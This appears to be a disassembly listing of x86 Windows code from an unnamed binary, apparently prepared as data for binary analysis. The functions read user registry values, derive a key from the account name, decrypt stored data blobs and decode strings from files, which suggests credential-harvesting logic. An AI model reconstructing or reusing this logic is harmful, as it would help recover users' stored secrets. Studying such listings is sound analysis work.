mov dl [ edx + r--data ]
mov [ ecx + 0x2 ] dl
jmp r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
mov edx eax
shr edx 0xc
and edx ebx
mov dl [ edx + r--data ]
shr eax 0x12
and eax ebx
mov [ ecx + 0x1 ] dl
mov al [ eax + r--data ]
mov [ ecx ] al
sub_410415
push ebp
mov ebp esp
sub esp 0xa44
push ebx
mov eax 0x200
push esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
push edi
lea eax [ ebp - 0x240 ]
xor ebx ebx
push eax
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_40c588
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
push [ ebp - 0x240 ]
push ebx
call [ LookupAccountSidA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov esi r--data
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x8 ]
xor edx edx
mov eax 0xba0da71d
cmp esi ebx
jbe r-xdata
mov edi [ ebp - 0xc ]
cmp edi ebx
jbe r-xdata
movsx edi [ ebp + edx - 0x640 ]
imul edi eax
imul eax eax 0xbc8f
mov ecx edx
and ecx 0x3
lea ecx [ ebp + ecx * 4 - 0x38 ]
xor [ ecx ] edi
inc edx
cmp edx esi
jb r-xdata
mov al [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
or al 0x1
lea esi [ ebp - 0xa40 ]
xor edx edx
lea edx [ ebp - 0x440 ]
sub edx esi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0xa40 ]
sub esi eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x20 ]
push eax
push ebx
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x20 ] 0x10
mov [ ebp - 0x28 ] esi
call [ rw-data ]
test eax eax
je r-xdata
add ecx 0x2
inc edx
cmp edx 0x4
jl r-xdata
movsx ebx [ edx + esi ]
imul ebx eax
imul eax eax 0xbc8f
mov ecx esi
and ecx 0x3
lea ecx [ ebp + ecx * 4 - 0x38 ]
xor [ ecx ] ebx
inc esi
dec edi
jne r-xdata
xor ebx ebx
mov esi [ ebp + 0xc ]
push 0xfff
push esi
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
push [ ebp - 0x14 ]
xor ecx ecx
mov [ ebp - 0x4 ] eax
mov [ esi + eax * 2 ] cx
call [ LocalFree@IAT ]
cmp [ ecx ] bx
je r-xdata
jmp r-xdata
cmp [ ecx ] bx
jne r-xdata
cmp [ ecx + 0x2 ] bx
je r-xdata
lea edx [ ebp - 0x640 ]
cmp esi edx
jae r-xdata
mov dl [ ecx ]
mov bl [ ecx + 0x2 ]
dec dl
shl dl 0x4
sub bl 0x21
or dl bl
sub dl al
mov [ esi ] dl
mov dl 0xf5
inc esi
imul dl
add ecx 0x4
xor ebx ebx
sub_410593
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41aca2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x301c
call sub_406c70
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0x1000
push edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x10 ] eax
test esi esi
je r-xdata
mov ecx [ esp + 0x302c ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x1028 ]
push eax
push r--data
push esi
mov ebx 0x80000001
push ebx
lea edi [ esp + 0x34 ]
call sub_40c4dc
test al al
je r-xdata
lea eax [ esp + 0x28 ]
push eax
push r--data
push esi
push ebx
lea edi [ esp + 0x20 ]
call sub_40c4dc
test al al
jne r-xdata
lea eax [ esp + 0x2028 ]
push eax
lea eax [ esp + 0x102c ]
push eax
call sub_410415
pop ecx
pop ecx
test eax eax
jle r-xdata
xor eax eax
mov [ esp + 0x28 ] ax
push esi
call [ lstrlenW@IAT ]
lea ebx [ esi + eax * 2 + 0x2 ]
lea esi [ esp + 0x14 ]
call sub_40c9fb
and [ esp + 0x3034 ] 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x4
pop edi
mov eax esi
mov [ esp + 0x14 ] 0x77010101
call sub_40cb2c
push r--data
mov eax esi
push eax
call sub_40ccf8
mov esi r--data
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push ebx
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x2028 ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x10 ]
push eax
xor ebx ebx
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_40cb2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_40cb2c
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ebx
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_40cce2
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x3
call sub_40cb2c
push [ 0x4 ]
lea eax [ esp + 0x18 ]
push eax
call sub_40cce2
mov edi [ 0x4 ]
cmp edi ebx
jle r-xdata
test eax eax
jns r-xdata
push esi
lea eax [ esp + 0x18 ]
push eax
call sub_40ccf8
push [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
push eax
call sub_40cccc
push [ esp + 0x18 ]
push ebx
push 0x64
call sub_40ed22
mov esi [ ebp + 0x10 ]
push eax
push ebx
push 0xff0f8211
push [ esp + 0x30 ]
push [ esp + 0x30 ]
call sub_40ffc9
or [ esp + 0x3034 ] 0xffffffff
lea esi [ esp + 0x14 ]
call sub_40c938
push [ 0x0 ]
lea eax [ esp + 0x18 ]
call sub_40cb2c
dec eax
cmp [ esi + eax * 2 ] 0x5c
je r-xdata
sub_4107ac
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41acb7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x402c
call sub_406c70
mov eax 0x1000
push ebx
push esi
mov [ esp + 0x28 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x8 ] eax
xor eax eax
mov esi r--data
push edi
cmp eax esi
je r-xdata
xor al al
lea eax [ esp + 0x1038 ]
push eax
push r--data
push esi
mov ebx 0x80000001
push ebx
lea edi [ esp + 0x3c ]
call sub_40c4dc
test al al
je r-xdata
lea eax [ esp + 0x2038 ]
push eax
push r--data
push esi
push ebx
lea edi [ esp + 0x30 ]
call sub_40c4dc
test al al
je r-xdata
lea eax [ esp + 0x38 ]
push eax
push r--data
push esi
push ebx
lea edi [ esp + 0x1c ]
call sub_40c4dc
test al al
je r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x2038 ]
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x24 ]
push eax
push 0x1
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ esp + 0x48 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x24 ]
lea eax [ esp + 0x303c ]
push [ esp + 0x2c ]
push eax
call sub_406530
add esp 0xc
push [ esp + 0x28 ]
call [ LocalFree@IAT ]
lea esi [ esp + 0x10 ]
call sub_40c9fb
mov [ esp + 0x4044 ] ebx
lea eax [ esp + 0xc ]
push eax
push 0x4
pop edi
mov eax esi
mov [ esp + 0x10 ] 0x77010101
call sub_40cb2c
push r--data
mov eax esi
push eax
call sub_40ccf8
lea eax [ esp + 0x38 ]
push eax
mov eax esi
push eax
call sub_40ccf8
mov esi r--data
push esi
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x1038 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x3038 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
call sub_40cb2c
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
call sub_40cb2c
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_40cce2
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x3
call sub_40cb2c
push [ 0x4 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40cce2
mov edi [ 0x4 ]
cmp edi ebx
jle r-xdata
push esi
lea eax [ esp + 0x14 ]
push eax
call sub_40ccf8
push [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
push eax
call sub_40cccc
push [ esp + 0x14 ]
push ebx
push 0x64
call sub_40ed22
mov esi [ ebp + 0x8 ]
push eax
push ebx
push 0xff0f8211
push [ esp + 0x2c ]
push [ esp + 0x2c ]
call sub_40ffc9
or [ esp + 0x4044 ] 0xffffffff
lea esi [ esp + 0x10 ]
call sub_40c938
mov al 0x1
jmp r-xdata
push [ 0x0 ]
lea eax [ esp + 0x14 ]
call sub_40cb2c
mov ecx [ esp + 0x403c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_410a2b
push ecx
push ebx
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
mov [ rw-data ] eax
test eax eax
jne r-xdata
push [ esp + 0xc ]
call sub_4107ac
pop ecx
mov ecx [ esp + 0xc ]
call sub_410a0f
mov al 0x1
xor al al
jmp r-xdata
pop ebx
pop ecx
retn
sub_410a68
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x10 ] 0x2
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] ebx
jg r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx ebx
je r-xdata
push ebx
push ebx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
mov al [ ebp - 0x5 ]
cmp al bl
jne r-xdata
push 0x48
pop edx
lea eax [ ebp - 0x5c ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x10 ]
mov [ ecx ] ebx
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
mov eax [ ecx ]
push ebx
lea edx [ ebp - 0x5c ]
push edx
push ecx
call [ eax + 0x30 ]
cmp [ ebp - 0x54 ] ebx
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax 0x200000
cmp [ ebp - 0x54 ] eax
jb r-xdata
mov edi [ ebp - 0x54 ]
xor esi esi
mov [ ebp - 0xc ] ebx
cmp edi ebx
jbe r-xdata
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x10 ] ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0xc ]
push edx
mov edx [ ebp + 0xc ]
push edi
add edx esi
push edx
push eax
call [ ecx + 0xc ]
cmp eax 0x1
jne r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax 0x8000000a
jne r-xdata
add esi [ ebp - 0xc ]
sub edi [ ebp - 0xc ]
jmp r-xdata
cmp esi [ ebp - 0x54 ]
jb r-xdata
cmp esi [ ebp - 0x54 ]
jb r-xdata
sub_410b42
push ebp
mov ebp esp
mov eax 0x8114
call sub_406c70
push esi
push edi
lea eax [ ebp - 0x14 ]
push eax
call [ UuidCreate@IAT ]
xor eax eax
mov [ ebp - 0x114 ] ax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xb ]
push eax
movzx eax [ ebp - 0xc ]
mov edi [ wsprintfW@IAT ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x14 ]
lea eax [ ebp - 0x114 ]
push r--data
push eax
call edi
add esp 0x34
mov ecx 0x8000
lea eax [ ebp - 0x8114 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x8114 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x8114 ]
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x94 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x8114 ]
push eax
call esi
push [ rw-data ]
lea eax [ ebp - 0x94 ]
push [ rw-data ]
push r--data
push eax
call edi
add esp 0x10
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x8114 ]
push eax
call esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x94 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x8114 ]
push eax
call esi
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x94 ]
push r--data
push eax
call edi
add esp 0xc
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x8114 ]
push eax
call esi
mov eax [ ebx ]
mov ecx [ ebp + 0xc ]
test eax eax
je r-xdata
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x8114 ]
push eax
call sub_410a68
add esp 0xc
pop edi
pop esi
leave
retn
mov [ ecx ] 0x0
inc ecx
dec eax
jne r-xdata
sub_410cad
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ad7d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
lea eax [ esp + 0x28 ]
push eax
call sub_412634
and [ esp + 0x7c ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x80beaa2a
call sub_40d34b
and [ esp + 0x10 ] 0x0
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ esp + 0x1c ] 0x40211202
push r--data
call sub_40f29b
mov ebx r--data
mov ecx eax
call sub_412df3
mov [ rw-data ] eax
test eax eax
jne r-xdata
or [ esp + 0x7c ] 0xffffffff
lea eax [ esp + 0x28 ]
push eax
call sub_4125f1
mov al bl
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x2c ]
mov [ esp + 0x1c ] 0x703295f9
call sub_412589
lea eax [ esp + 0x18 ]
push eax
lea esi [ esp + 0x24 ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x1c ] 0x7f4becad
call sub_4125af
lea eax [ esp + 0x18 ]
push eax
lea esi [ esp + 0x28 ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x1c ] 0x69b8e0a0
call sub_4125af
xor esi esi
inc [ rw-data ]
or [ esp + 0x7c ] 0xffffffff
lea eax [ esp + 0x28 ]
push eax
call sub_4125f1
xor al al
mov ecx [ esp + 0x74 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov bl 0x1
push [ esp + 0x14 ]
push [ ebp + 0xc ]
push 0x64
call sub_410b42
add esp 0xc
test al al
jne r-xdata
mov eax [ esp + 0x20 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc esi
cmp esi [ esp + 0x24 ]
jle r-xdata
push [ esp + 0x14 ]
mov ebx [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x65
call sub_410b42
add esp 0xc
test al al
jne r-xdata
jmp r-xdata
inc [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x54 ]
push eax
push ecx
call sub_4155b9
pop ecx
push eax
call sub_4154a1
mov [ esp + 0x7c ] 0x1
push eax
lea ebx [ esp + 0x2c ]
call sub_40157d
xor ebx ebx
mov [ esp + 0x7c ] bl
lea eax [ esp + 0x4c ]
push eax
call sub_4125f1
mov eax [ esp + 0x30 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
sub_410e64
sub esp 0x420
push ebx
push ebp
xor ebp ebp
push esi
push edi
mov [ esp + 0x18 ] 0xb
mov [ esp + 0x1c ] ebp
mov [ esp + 0x2c ] ebp
mov [ esp + 0x14 ] ebp
mov ecx 0x400
lea eax [ esp + 0x30 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov esi [ lstrlenA@IAT ]
mov edi r--data
xor al al
mov ebx [ esp + 0x434 ]
push ebx
call esi
sub eax 0x3
cmp ebp eax
jae r-xdata
movsx eax [ ebx + ebp ]
push eax
push edi
call sub_4026f0
mov [ esp + 0x28 ] eax
movsx eax [ ebx + ebp + 0x1 ]
push eax
push edi
call sub_4026f0
add esp 0x10
cmp [ esp + 0x20 ] 0x0
mov [ esp + 0x28 ] eax
je r-xdata
test eax eax
je r-xdata
push eax
call esi
push edi
mov ebx eax
call esi
push [ esp + 0x20 ]
sub eax ebx
cdq
and edx 0xf
add eax edx
mov [ esp + 0x28 ] eax
sar [ esp + 0x28 ] 0x4
call esi
push edi
mov ebx eax
call esi
mov ecx eax
sub ecx ebx
shl ecx 0x2
or ecx [ esp + 0x24 ]
test ebp ebp
jne r-xdata
mov eax [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov [ esp + eax + 0x30 ] cl
lea eax [ ebp + 0x2 ]
cmp eax [ esp + 0x18 ]
ja r-xdata
mov eax 0x103
sub eax ecx
lea edx [ eax - 0x4 ]
mov [ esp + 0x1c ] edx
push 0x3
xor edx edx
mov [ esp + 0x1c ] eax
pop ebx
div ebx
add [ esp + 0x18 ] eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov eax [ esp + 0x434 ]
movsx eax [ eax + ebp + 0x2 ]
push eax
push edi
call sub_4026f0
pop ecx
pop ecx
mov [ esp + 0x20 ] eax
test eax eax
je r-xdata
mov eax 0x3ff
cmp [ esp + 0x1c ] eax
jb r-xdata
push eax
call esi
push edi
mov ebx eax
call esi
push [ esp + 0x28 ]
sub eax ebx
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ esp + 0x17 ] al
and [ esp + 0x17 ] 0xf
call esi
push edi
mov ebx eax
call esi
mov ecx [ esp + 0x14 ]
sub al bl
shl al 0x4
and al 0xf0
or al [ esp + 0x13 ]
inc [ esp + 0x14 ]
mov [ esp + ecx + 0x30 ] al
lea eax [ ebp + 0x3 ]
cmp eax [ esp + 0x18 ]
ja r-xdata
mov esi [ esp + 0x1c ]
xor eax eax
test esi esi
je r-xdata
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x434 ]
movsx eax [ eax + ebp + 0x3 ]
push eax
push edi
call sub_4026f0
pop ecx
pop ecx
mov [ esp + 0x28 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x438 ]
mov [ esi + eax ] 0x0
mov al 0x1
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea ecx [ esp + ecx + 0x2f ]
push [ esp + 0x20 ]
call esi
push edi
mov ebx eax
call esi
push [ esp + 0x28 ]
sub al bl
shl al 0x6
mov [ esp + 0x17 ] al
and [ esp + 0x17 ] 0xc0
call esi
push edi
mov ebx eax
call esi
mov ecx [ esp + 0x14 ]
sub al bl
and al 0x3f
or al [ esp + 0x13 ]
inc [ esp + 0x14 ]
add ebp 0x4
inc [ esp + 0x2c ]
mov [ esp + ecx + 0x30 ] al
cmp ebp [ esp + 0x18 ]
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x420
retn
mov dl [ ecx ]
mov edi [ esp + 0x438 ]
xor dl 0x5a
mov [ eax + edi ] dl
inc eax
dec ecx
cmp eax esi
jb r-xdata
cmp [ esp + 0x2c ] 0x64
ja r-xdata
sub_411088
push ebx
push esi
call [ lstrlenW@IAT ]
test esi esi
je r-xdata
xor eax eax
push eax
push esi
call sub_4100a9
jmp r-xdata
mov ebx eax
mov eax rw-data
call sub_410115
pop ebx
retn
sub_4110ad
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_41adfb
push eax
mov [ fs : 0x0 ] esp
sub esp 0x480
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov ecx [ esp + 0x48c ]
pop edi
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push [ ebp + 0xc ]
call sub_40d7b3
mov esi eax
cmp esi 0xffffffff
je r-xdata
push ebx
push esi
call [ GetFileSize@IAT ]
mov edi eax
call sub_412da8
push edi
push eax
push esi
mov [ esp + 0x5c ] eax
call sub_40d72c
push esi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x50 ]
mov eax [ ecx ]
mov edx eax
imul edx edx 0xd
lea edx [ edx + ecx + 0x4 ]
mov [ esp + 0x78 ] edx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] ebx
cmp eax ebx
jle r-xdata
push [ esp + 0x44 ]
call sub_412d05
push [ esp + 0x34 ]
call sub_412d05
push [ esp + 0x40 ]
call sub_412d05
push [ esp + 0x3c ]
call sub_412d05
push [ esp + 0x38 ]
call sub_412d05
push [ esp + 0x30 ]
call sub_412d05
push [ esp + 0x2c ]
call sub_412d05
push [ esp + 0x50 ]
call sub_412d05
lea edx [ ecx + 0x5 ]
mov [ esp + 0x4c ] edx
mov [ esp + 0x54 ] eax
mov edx [ esp + 0x4c ]
add edx 0xd
dec [ esp + 0x54 ]
mov [ esp + 0x4c ] edx
jne r-xdata
mov ecx [ edx ]
xor eax eax
cmp [ edx - 0x1 ] bl
jne r-xdata
cmp [ esp + 0x44 ] ebx
je r-xdata
cmp eax 0x8
jae r-xdata
inc eax
cmp eax 0x8
jb r-xdata
cmp [ esp + 0x38 ] ebx
je r-xdata
cmp [ esp + 0x3c ] ebx
je r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ esp + 0x78 ]
lea ecx [ ecx + edx + 0x8 ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x88 ] bl
cmp [ eax * 8 + r--data ] bl
je r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
cmp [ esp + 0x2c ] ebx
je r-xdata
cmp [ esp + 0x34 ] ebx
jne r-xdata
push [ esp + 0x48 ]
call [ lstrlenA@IAT ]
lea esi [ eax + eax ]
mov [ esp + 0x58 ] eax
mov eax esi
call sub_412da8
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esp + 0x88 ]
push eax
push ecx
call sub_410e64
pop ecx
pop ecx
test al al
je r-xdata
cmp [ esp + 0x30 ] ebx
je r-xdata
lea esi [ esp + 0xc ]
call sub_40c9fb
mov [ esp + 0x494 ] ebx
lea eax [ esp + 0x80 ]
push eax
push 0x4
pop edi
mov eax esi
mov [ esp + 0x84 ] 0x77010101
call sub_40cb2c
push r--data
mov eax esi
push eax
call sub_40ccf8
push [ esp + 0x3c ]
mov eax esi
push eax
call sub_40ccf8
push r--data
mov eax esi
push eax
call sub_40ccf8
push [ esp + 0x44 ]
mov eax esi
push eax
call sub_40ccf8
push [ esp + 0x34 ]
mov eax esi
push eax
call sub_40ccf8
lea eax [ esp + 0x74 ]
push eax
mov eax esi
mov [ esp + 0x78 ] ebx
call sub_40cb2c
lea eax [ esp + 0x64 ]
push eax
mov eax esi
mov [ esp + 0x68 ] ebx
call sub_40cb2c
lea eax [ esp + 0x84 ]
push eax
mov eax esi
mov [ esp + 0x88 ] ebx
call sub_40cb2c
call [ GetACP@IAT ]
push eax
mov eax esi
push eax
call sub_40cce2
lea eax [ esp + 0x6c ]
push eax
mov eax esi
mov [ esp + 0x70 ] 0x3
call sub_40cb2c
push [ 0x4 ]
mov eax esi
push eax
call sub_40cce2
mov edi [ 0x4 ]
cmp edi ebx
jle r-xdata
cmp [ esp + 0x40 ] ebx
je r-xdata
mov ecx esi
cmp esi ebx
je r-xdata
lea eax [ esp + 0x88 ]
mov [ esp + 0x48 ] eax
lea esi [ esp + 0x1c ]
call sub_40c9fb
mov [ esp + 0x494 ] 0x1
lea eax [ esp + 0x7c ]
push eax
push 0x4
pop edi
mov eax esi
mov [ esp + 0x80 ] 0x77010101
call sub_40cb2c
push r--data
mov eax esi
push eax
call sub_40ccf8
push [ esp + 0x2c ]
mov eax esi
push eax
call sub_40ccf8
mov esi r--data
push esi
lea eax [ esp + 0x20 ]
push eax
call sub_40ccf8
push [ esp + 0x38 ]
lea eax [ esp + 0x20 ]
push eax
call sub_40ccf8
push [ esp + 0x30 ]
lea eax [ esp + 0x20 ]
push eax
call sub_40ccf8
lea eax [ esp + 0x5c ]
push eax
lea eax [ esp + 0x20 ]
mov [ esp + 0x60 ] ebx
call sub_40cb2c
lea eax [ esp + 0x60 ]
push eax
lea eax [ esp + 0x20 ]
mov [ esp + 0x64 ] ebx
call sub_40cb2c
lea eax [ esp + 0x68 ]
push eax
lea eax [ esp + 0x20 ]
mov [ esp + 0x6c ] ebx
call sub_40cb2c
call [ GetACP@IAT ]
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_40cce2
lea eax [ esp + 0x70 ]
push eax
lea eax [ esp + 0x20 ]
mov [ esp + 0x74 ] 0x3
call sub_40cb2c
push [ 0x4 ]
lea eax [ esp + 0x20 ]
push eax
call sub_40cce2
mov edi [ 0x4 ]
cmp edi ebx
jle r-xdata
push [ esp + 0x40 ]
lea eax [ esp + 0x10 ]
push eax
call sub_40ccf8
push [ esp + 0x10 ]
lea eax [ esp + 0x10 ]
push eax
call sub_40cccc
push [ esp + 0x10 ]
push ebx
push 0x64
call sub_40ed22
mov esi [ ebp + 0x8 ]
push eax
push ebx
push 0xff0f8211
push [ esp + 0x28 ]
push [ esp + 0x28 ]
call sub_40ffc9
or [ esp + 0x494 ] 0xffffffff
lea esi [ esp + 0xc ]
call sub_40c938
push [ 0x0 ]
mov eax esi
call sub_40cb2c
push esi
push edi
push [ esp + 0x60 ]
push [ esp + 0x54 ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push esi
lea eax [ esp + 0x20 ]
push eax
call sub_40ccf8
push [ esp + 0x20 ]
lea eax [ esp + 0x20 ]
push eax
call sub_40cccc
push [ esp + 0x20 ]
push ebx
push 0x64
call sub_40ed22
mov esi [ ebp + 0x8 ]
push eax
push ebx
push 0xff0f8211
push [ esp + 0x38 ]
push [ esp + 0x38 ]
call sub_40ffc9
or [ esp + 0x494 ] 0xffffffff
lea esi [ esp + 0x1c ]
call sub_40c938
push [ 0x0 ]
lea eax [ esp + 0x20 ]
call sub_40cb2c
mov eax [ esp + 0x4c ]
mov eax [ eax ]
sub eax 0x8179
je r-xdata
mov [ esp + 0x2c ] edi
sub eax 0x1b
je r-xdata
mov [ esp + 0x40 ] edi
jmp r-xdata
dec eax
je r-xdata
mov [ esp + 0x44 ] edi
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ esp + 0x3c ] edi
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ esp + 0x30 ] edi
jmp r-xdata
dec eax
je r-xdata
mov [ esp + 0x38 ] edi
jmp r-xdata
sub eax 0x16
jne r-xdata
mov [ esp + 0x34 ] edi
jmp r-xdata
sub_41157b
push ebp
mov ebp esp
sub esp 0x20c
push esi
xor eax eax
push 0x206
push eax
mov [ ebp - 0x208 ] ax
lea eax [ ebp - 0x206 ]
push eax
call sub_405830
add esp 0xc
push [ ebp + 0xc ]
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ ebp - 0x208 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call sub_40d843
test al al
je r-xdata
mov al 0x1
pop esi
leave
retn
lea esi [ ebp - 0x208 ]
call sub_411088
test al al
je r-xdata
mov eax esi
push eax
push [ ebp + 0x8 ]
call sub_4110ad
pop ecx
pop ecx
sub_411616
push ebp
